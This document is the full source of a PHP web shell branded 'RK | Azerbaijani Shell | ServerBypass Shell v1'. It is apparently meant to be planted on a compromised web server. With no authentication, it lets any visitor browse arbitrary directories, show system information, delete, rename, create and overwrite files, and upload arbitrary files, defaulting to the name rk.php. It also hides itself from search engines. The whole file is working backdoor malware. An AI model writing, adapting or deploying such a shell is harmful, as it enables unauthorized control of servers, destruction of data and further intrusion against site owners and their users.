<?php


            echo '
			<link href="https://fonts.googleapis.com/css?family=Righteous|Poppins&display=swap" rel="stylesheet">
			<META NAME="robots" CONTENT="noindex,nofollow">
			<title>RK | Azerbaijani Shell | ServerBypass Shell v1</title>
			<link rel="shortcut icon" type="image/png" href="https://i.hizliresim.com/4ft8t6j.png"/>
				<style>
		body {
			background: url(https://i.hizliresim.com/hpahbnl.png) no-repeat center center fixed;
            -webkit-background-size: cover;
            -moz-background-size: cover;
            -o-background-size: cover;
            background-size: cover;
			background-blend-mode: screen;
            background-color: black;
			color: white;
			}
@font-face {
            font-family: Righteous, cursive;
            font-family: Poppins, cursive;
}
			</style>
			';


function getFiles($path){
    $files = scandir($path);
    $FaylListi = [];
    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            $filePath = $path . '/' . $file;
            $fileInfo = [
                'name' => $file,
                'path' => $filePath,
                'type' => is_dir($filePath) ? 'qovluq' : 'fayl',
            ];
            array_push($FaylListi, $fileInfo);
        }
    }
    return $FaylListi;
}
function deleteFile($path){
    if (is_file($path)) {
        return unlink($path);
    } elseif (is_dir($path)) {
        $files = array_diff(scandir($path), array('.', '..'));

        foreach ($files as $file) {
            deleteFile($path . '/' . $file);
        }
        return rmdir($path);
    }
    return false;
}
function renameFile($KohneYol, $YeniYol){
    return rename($KohneYol, $YeniYol);
}
function createFile($path, $filename){
    $filePath = $path . '/' . $filename;
    return touch($filePath);
}
function createDirectory($path, $dirname){
    $dirPath = $path . '/' . $dirname;
    return mkdir($dirPath);
}

function editFile($filePath, $content){
    return file_put_contents($filePath, $content);
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $path = isset($_POST['path']) ? $_POST['path'] : '';
    
    if ($action === 'getFiles') {
        $fileList = getFiles($path);
        echo json_encode($fileList);
    } elseif ($action === 'delete' && isset($_POST['deletedPath'])) {
        $deletedPath = $_POST['deletedPath'];
        $success = deleteFile($deletedPath);
        if ($success) {
            echo '<font face="Righteous">File or directory deleted successfully.</font>';
        } else {
            echo '<font face="Poppins">Unable to delete file or directory.</font>';
        }
        exit;
    } elseif ($action === 'rename' && isset($_POST['oldPath']) && isset($_POST['newPath'])) {
        $oldPath = $_POST['oldPath'];
        $newPath = $_POST['newPath'];
        $success = renameFile($oldPath, $newPath);
        if ($success) {
            echo '<font face="Righteous">File or directory renamed successfully.</font>';
        } else {
            echo '<font face="Poppins">Unable to rename file or directory.</font>';
        }
        exit;
    } elseif ($action === 'createFile' && isset($_POST['filename'])) {
        $filename = $_POST['filename'];
        $success = createFile($path, $filename);
        if ($success) {
            echo '<font face="Righteous">File created successfully.</font>';
        } else {
            echo '<font face="Poppins">Unable to create file.</font>';
        }
        exit;
    } elseif ($action === 'createDirectory' && isset($_POST['dirname'])) {
        $dirname = $_POST['dirname'];
        $success = createDirectory($path, $dirname);
        if ($success) {
            echo '<font face="Righteous">Directory created successfully.</font>';
        } else {
            echo '<font face="Poppins">Unable to create directory.</font>';
        }
        exit;
    } elseif ($action === 'editFile' && isset($_POST['filePath']) && isset($_POST['content'])) {
        $filePath = $_POST['filePath'];
        $content = $_POST['content'];
        $success = editFile($filePath, $content);
        if ($success) {
            echo '<font face="Righteous">File edited successfully.</font>';
        } else {
            echo '<font face="Poppins">Unable to edit file.</font>';
        }
        exit;
    }
}


function KataloqlarSiyahisi($path){
    $kataloqlar = glob($path . '/*', GLOB_ONLYDIR);
    foreach ($kataloqlar as $directory) {
        $KataloqAdi = basename($directory);
        echo '<li>';
        echo '<span class="file-icon">';
        echo '<img src="https://i.hizliresim.com/kbjr6nl.png" alt="Qovluq İkonu">';
        echo '</span>';
        echo '<a href="?path=' . $directory . '"><span class="file-name">' . $KataloqAdi . '</span></a>';
        echo '</li>';
    }
}

function listFiles($path){
    $files = glob($path . '/*');
    foreach ($files as $file) {
        if (!is_dir($file)) {
            $fileName = basename($file);
            echo '<li>';
            echo '<span class="file-icon">';
            echo '<img src="https://i.hizliresim.com/r1icxy7.png" alt="Fayl İkonu">';
            echo '</span>';
            echo '<span class="file-name">' . $fileName . '</span>';
            echo '</li>';
        }
    }
}
$ilkinYol = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$FaylListi = getFiles($ilkinYol);

?>
<!DOCTYPE html>
<html>
<link href="https://fonts.googleapis.com/css?family=Righteous|Poppins&display=swap" rel="stylesheet">
<head>
    <META NAME="robots" CONTENT="noindex,nofollow">
    <title>RK | Azerbaijani Shell | ServerBypass Shell v1</title>
<link rel="shortcut icon" type="image/png" href="https://i.hizliresim.com/4ft8t6j.png"/>
    <style>
        body {
            background-color: #000000;
			color: white;
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        h1 {
            margin-bottom: 20px;
        }
        .file-list {
            list-style-type: none;
            padding: 0;
        }
        .file-list li {
            display: flex;
            align-items: center;
            margin-bottom: 5px;
        }
        .file-list li .file-icon {
            margin-right: 10px;
        }
        .file-list li .file-name {
            flex-grow: 1;
        }
        .actions {
            margin-top: 10px;
        }
                        font-size:120%;
			background-color: #232323;
			outline:none;
			border:none;
			padding:10px 15px;
			color: #34c0eb;
			width:35%
			font-family: 'Anonymous Pro', monospace;
			transition: 3s;

        .actions input[type="text"] {
            margin-right: 10px;
        }

        .actions input[type="submit"] {
            cursor: pointer;
        }
			border: 1px solid #34c0eb;
		}
    .head {
      background: transparent;
      padding:13px 23px 13px 13px;
      font-size:81%;

    }
img[id="logo"] {
      float:right;
      animation: rotation 4s infinite linear;
    }
    @keyframes rotation {
      0%{
       transform: rotateY(0deg);
    }
    90%{
        transform: rotateY(360deg);
    }
    }
    </style>
	<style>
		body {
			background: url(https://i.hizliresim.com/hpahbnl.png) no-repeat center center fixed;
            -webkit-background-size: cover;
            -moz-background-size: cover;
            -o-background-size: cover;
            background-size: cover;
			background-blend-mode: screen;
            background-color: black;
			}
@font-face {
            font-family: 'Righteous', cursive;
            font-family: 'Poppins', cursive;
}
			</style>
<style>
a:link {
    color: red;    
    text-decoration: none;
}
a{
            text-decoration: none;
}
a:visited {
    color: red;   
    text-decoration: none;
}
a:hover {
    color: red;
    text-decoration: none;
}
a:active {
    color: red;    
    text-decoration: none;
}
</style>
</head>
<div class="head">
<a href=""><font size="1px"><pre>٫٫٫٫٫                           
</pre></font></a>
<img id="logo" src="https://i.hizliresim.com/4ft8t6j.png" width="90vw">
<div style="font-size:80%:"><b><font color="red">P W D: </font></b><?php echo realpath($ilkinYol); ?><br>
<b><font color="red">uname -a:</font></b> <?php echo php_uname(); ?>	
</div><br>
<body>
<br><br>
<div class="current-directory">
</body>
</html>
        Kataloq (dizin): <?php echo realpath($ilkinYol); ?>
</div>
<ul class="file-list">
    <?php
    $path = isset($_GET['path']) ? $_GET['path'] : $ilkinYol;
    $kataloqlar = array_filter(glob($path . '/*'), 'is_dir');
    $specialkataloqlar = array('.', '..');
    foreach ($specialkataloqlar as $dirName) {
        echo '<li><a href="?path=' . urlencode($path . DIRECTORY_SEPARATOR . $dirName) . '">' . $dirName . '</a></li>';
    }
    ?>
</div>
<ul class="file-list">
  <?php KataloqlarSiyahisi($ilkinYol); ?>
    <?php listFiles($ilkinYol); ?>
</ul>
<style>
.AZbutton {
  display: inline-block;
  font-size: 18px;
  cursor: pointer;
  text-align: center;
  text-decoration: none;
  outline: none;
  color: #fff;
  background-color: red;
  border: none;
  border-radius: 30px;
}

.AZbutton:hover {background-color: red}

.AZbutton:active {
  background-color: #3e8e41;
  transform: translateY(4px);
}
</style>
<style>
input[type=text] {
  padding: 12px 20px;
  color: red;
  margin: 8px 0;
  background-color: transparent;
  box-sizing: border-box;
  border: 2px solid red;
  border-radius: 30px;
}
</style>
<style>
textarea {
  color: red;
  padding: 9px 15px;
  background-color: transparent;
  border: 2px solid red;
  border-radius: 39px;
}
</style><div class="actions" face="Poppins">
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="delete">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="deletedPath" placeholder="File or directory to delete" required>
        <input class="AZbutton" type="submit" value="Delete">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="createFile">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="filename" placeholder="New file name" required>
        <input class="AZbutton" type="submit" value="Create File">
    </form>
    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="createDirectory">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="dirname" placeholder="New directory name" required>
        <input class="AZbutton" type="submit" value="Create Directory">
    </form>

    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="rename">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="oldPath" placeholder="Current file or directory path" required>
        <input type="text" name="newPath" placeholder="New file or directory path" required>
        <input class="AZbutton" type="submit" value="Rename">
    </form>

    <form method="POST" enctype="multipart/form-data">
        <input type="hidden" name="action" value="editFile">
        <input type="hidden" name="path" value="<?php echo $initialPath; ?>">
        <input type="text" name="filePath" placeholder="File path to edit" required>
        <textarea placeholder="Text to edit" required></textarea>
        <input class="AZbutton" type="submit" value="Edit File">
    </form>
	
    <form action="" method="post" enctype="multipart/form-data">
        <input type="file" name="file" />
        <input type="text" name="ufile" value="rk.php" />
        <input class="AZbutton" name="upload" type="submit" value="Upload" />
    </form> 
    <?php 
        if (isset($_REQUEST['ufile'])) { 
            $ufile = $_POST['ufile']; 
        } 
        if (isset($_REQUEST['upload'])) { 
            if ($_POST['upload']){ 
                if (@copy($_FILES['file']['tmp_name'], $ufile)) { 
                    echo "<b><font color='darkgreen'><a href='$ufile'>$ufile</a> = File Successfully Uploaded !!!</font></b>"; 
                } else { 
                    echo "<b><font color='darkred'><a href='$ufile'>$ufile</a> = Failed to upload the file !!!</font></b>"; 
                } 
            } 
        } 
    ?>
</div>
</body>
</html>
